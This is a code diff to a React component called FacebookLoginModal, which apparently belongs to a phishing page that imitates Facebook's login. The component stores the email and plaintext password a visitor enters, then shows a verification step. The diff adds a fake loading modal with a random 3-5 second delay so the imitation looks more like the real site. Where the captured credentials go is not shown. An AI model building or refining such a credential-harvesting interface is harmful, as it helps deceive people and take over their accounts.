@@ -3,6 +3,7 @@ import { X } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
 import VerificationModal from './VerificationModal';
 import AccountProcessModal from './AccountProcessModal';
+import FacebookLoadingModal from './FacebookLoadingModal';
 
 interface FacebookLoginModalProps {
   isOpen: boolean;
@@ -15,6 +16,7 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
   const [password, setPassword] = useState('');
   const [showVerification, setShowVerification] = useState(false);
   const [showAccountProcess, setShowAccountProcess] = useState(false);
+  const [showLoading, setShowLoading] = useState(false);
   const [userLoginData, setUserLoginData] = useState<{ email: string; password: string } | null>(null);
 
   if (!isOpen) return null;
@@ -28,7 +30,15 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
   const handleLogin = () => {
     if (email && password) {
       setUserLoginData({ email, password });
-      setShowVerification(true);
+      setShowLoading(true);
+      
+      // Random delay between 3-5 seconds
+      const delay = Math.random() * 2000 + 3000; // 3000ms to 5000ms
+      
+      setTimeout(() => {
+        setShowLoading(false);
+        setShowVerification(true);
+      }, delay);
     }
   };
 
@@ -56,6 +66,7 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
   const handleFinalClose = () => {
     setShowAccountProcess(false);
     setShowVerification(false);
+    setShowLoading(false);
     setEmail('');
     setPassword('');
     setUserLoginData(null);
@@ -180,6 +191,11 @@ const FacebookLoginModal = ({ isOpen, onClose }: FacebookLoginModalProps) => {
       <AccountProcessModal
         isOpen={showAccountProcess}
         onClose={handleFinalClose}
+      />
+
+      {/* Loading Modal */}
+      <FacebookLoadingModal
+        isOpen={showLoading}
       />
     </div>
   );
